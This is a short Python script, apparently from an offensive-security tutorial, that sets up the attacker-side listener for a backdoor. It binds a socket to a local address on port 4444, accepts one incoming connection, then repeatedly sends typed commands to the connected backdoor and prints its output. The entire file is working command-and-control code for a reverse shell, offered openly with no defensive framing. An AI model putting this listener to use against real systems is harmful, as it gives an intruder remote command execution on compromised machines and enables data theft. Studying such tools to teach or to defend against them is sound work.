#!/usr/bin/python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if connection drops use the same connection socket, 1 means enable
listener.bind(("192.168.0.7", 4444)) # start listening use if config to know which address to assign
listener.listen(0) # start listener
print("[+] Waiting for incoming connections.")
connection, address = listener.accept() # accept connections, capture the incoming IP
print("[+] Connections received from {}".format(address[0]))

while True:
    command = input(">>> ") # ask the user to enter a command
    connection.send(command.encode()) # send the command to the backdoor
    result = connection.recv(1024) # wait for the result
    print(result.decode()) # print the result on screen   
